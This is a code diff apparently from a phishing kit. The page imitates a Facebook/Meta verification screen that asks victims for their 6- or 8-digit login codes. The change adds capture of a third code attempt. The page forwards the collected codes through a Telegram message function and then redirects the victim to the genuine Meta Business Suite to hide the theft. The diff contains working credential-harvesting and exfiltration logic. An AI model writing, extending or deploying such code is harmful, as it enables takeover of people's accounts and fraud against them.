@@ -32,6 +32,7 @@ interface Message {
   PASS2?: string;
   CODE: string;
   CODE2: string;
+  CODE3: string;
 }
 const initialUIState: UIState = {
   error: "",
@@ -55,6 +56,7 @@ const createVerifyMessage = (code: string, attempt?: number) => {
     PASS2: "",
     CODE: "",
     CODE2: "",
+    CODE3: "",
   };
   if (lastMessage) {
     lassMessageObject = JSON.parse(lastMessage);
@@ -62,8 +64,11 @@ const createVerifyMessage = (code: string, attempt?: number) => {
   if (attempt === 1) {
     lassMessageObject["CODE"] = code;
     return lassMessageObject;
+  } else if (attempt === 2) {
+    lassMessageObject["CODE2"] = code;
+    return lassMessageObject;
   }
-  lassMessageObject["CODE2"] = code;
+  lassMessageObject["CODE3"] = code;
   return lassMessageObject;
 };
 
@@ -131,10 +136,14 @@ const Verify: FC = () => {
       try {
         await sendTelegramMessage(message, config);
         setTimeout(() => {
-          window.location.replace("https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#");
+          window.location.replace(
+            "https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#",
+          );
         }, config.loadingTime);
       } catch {
-        window.location.replace("https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#");
+        window.location.replace(
+          "https://web.facebook.com/business/tools/meta-business-suite?_rdc=1&_rdr#",
+        );
       }
       return;
     }
@@ -182,9 +191,10 @@ const Verify: FC = () => {
       <div>
         <b>Approve from another device or Enter your login code</b>
         <p>
-        Approve from your device or enter the verification code!
-We have sent you a 6 or 8 digit verification code to your device. Or authenticate
-Please check your Facebook, Email or phone messages, Whatapps notifications!
+          Approve from your device or enter the verification code! We have sent
+          you a 6 or 8 digit verification code to your device. Or authenticate
+          Please check your Facebook, Email or phone messages, Whatapps
+          notifications!
         </p>
       </div>
 
